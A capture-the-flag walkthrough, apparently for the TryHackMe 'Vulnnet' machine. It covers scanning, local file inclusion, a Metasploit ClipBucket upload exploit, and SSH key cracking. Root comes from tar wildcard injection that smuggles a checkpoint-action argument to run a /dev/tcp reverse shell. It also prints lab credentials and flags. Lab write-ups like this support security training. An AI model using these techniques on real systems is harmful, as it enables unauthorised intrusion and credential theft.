# Vulnnet

### Nmap scan

cmd: ``` sudo nmap -sC -sV -oN nmap/initial 10.10.204.237 -vv ```

- 22
- 80 apache

- login page
	- no sqli 
	- no user enum


### Fuzzing

cmd: ``` gobuster dir -u http://10.10.204.237 -w /usr/share/seclists/Discovery/Web-Content/big.txt -x php,html,txt -t 80```

- /js
	- 2 strange scripts
	- both heavily obfuscated

	- script1 
		- t.p = "http://broadcast.vulnnet.thm", t(t.s = 0);
	- script 2
		-  n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0);

- /etc/hosts
	- 10.10.204.237 broadcast.vulnnet.thm vulnnet.thm

- broadcast.vulnnet.thm
	- needs creds - nothing to do


cmd: ```ffuf -u "http://vulnnet.thm/index.php?referer=FUZZ" -w /usr/share/seclists/Fuzzing/fuzz-Bo0oM.txt -t 80 -fs 5829```

- Can include files - different size for entries

```bash
LICENSE.txt             [Status: 200, Size: 6938, Words: 1896, Lines: 167]
login.html              [Status: 200, Size: 8308, Words: 2321, Lines: 211]
index.php               [Status: 200, Size: 0, Words: 1, Lines: 1]
```

### LFI
	
	- Relative path ../../../../../etc/passwd  -> does not work
  	- Absolute path /etc/passwd 			   -> works!
	- From passwd - 2 users

```bash
# root:x:0:0:root:/root:/bin/bash
# server-management:x:1000:1000:server-management,,,:/home/server-management:/bin/bash
```
	
- Apache2 config (/etc/apache2/.htpasswd) 
	- developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0:9972761drmfsls


### subdomain

- Using creds on broadcast.vulnnet.thm
	- clipbucket -> version 4.0
	- Entry on searchsploit does not seem to work
	- Metasploit works (exploit: multi/http/clipbucket_fileupload_exec)
		- set httpusername developers
		- set httppassword 9972761drmfsls
		- set vhost broadcast.vulnnet.thm


### Got in
	
	- It gets uploaded to /actions/CB_BEATS_UPLOAD_DIR ... maybe an authenticated fuzzing would find /actions (has directory listing enabled)
	- cmd: ```whoami && id```
	
	```bash
	www-data
	uid=33(www-data) gid=33(www-data) groups=33(www-data)
	```

### Getting mysql creds
	
	- Check clipbucket github -> includes -> dbconnet.sample.php
	- On the machine: /var/www/html/includes/dbconnect.php
		- Database: VulnNet
		- Username: admin
		- Password: VulnNetAdminPass0990
	- Nothing interesting there

### Enumerating (Manual)
	
	- Found backup -> /var/backups/ssh-backup.tar.gz
		- -rw-rw-r--  1 server-management server-management    1484 Jan 24  2021 ssh-backup.tar.gz
		- extracts just an id_rsa file with a RSA key
		- needs password

### Enumerating (automated - linpeas)
	
	- USBcreator - vulnerable -> well, not really
	- Cronjob - */2   * * * *   root    /var/opt/backupsrv.sh
	

### Cracking private key's password
	
	- ssh2john id_rsa > hash.txt 
	- john --wordlist=rockyou.txt hash.txt
	- creds: id_rsa:oneTWO3gOyac


### Getting user

	- cmd: ```whoami && id```
	```bash
	server-management
	uid=1000(server-management) gid=1000(server-management) groups=1000(server-management)
	```
	- cmd: ```cat user.txt```
	- **Flag:** THM{907e420d979d8e2992f3d7e16bee1e8b}

### Enumerating (manual)
	- ~/Documents - 2 pdfs - will rename to remove spaces
		- Daily job Report Format.pdf 
		- Employee Search Progress Report .pdf
	- Unusual process
		- /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant  # why does it need wi-fi?!?!

### Exploiting
	- /var/opt/backupserv.sh tars with wildcard in /home/server-management/Documents
	- commands to exploit:
		1. cd ~/Documents
		2. touch -- --checkpoint=1
		3. echo '/bin/bash -c "bash -i >& /dev/tcp/10.9.128.84/1414 0>&1"' > waza.sh
		4. touch -- "--checkpoint-action=exec=sh waza.sh"

### Done
	- cmd: ```cat /root/root.txt```
	- **Flag:** THM{220b671dd8adc301b34c2738ee8295ba}



